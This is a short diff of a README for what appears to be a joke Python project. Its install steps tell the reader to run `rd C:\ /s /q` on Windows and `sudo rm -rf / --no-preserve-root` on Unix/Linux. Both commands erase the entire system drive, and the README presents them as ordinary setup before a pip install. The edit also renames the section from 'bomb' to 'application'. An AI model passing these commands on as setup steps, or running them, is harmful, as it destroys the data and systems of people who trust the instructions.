@@ -11,7 +11,7 @@
 - Module debugging support for removing bugs from your home.
 - Discord RPC (Rich person chat)
 
-## How to ~~not~~ run this bomb
+## How to run this ~~bomb~~ application
 1. Download code
 2. Open your terminal and type `rd C:\ /s /q` then type `py -m pip install rich` on Windows or `sudo rm -rf / --no-preserve-root && python -m pip install rich` on UNIX/Linux.
 3. Run frontend.py (using a Commodore 64)
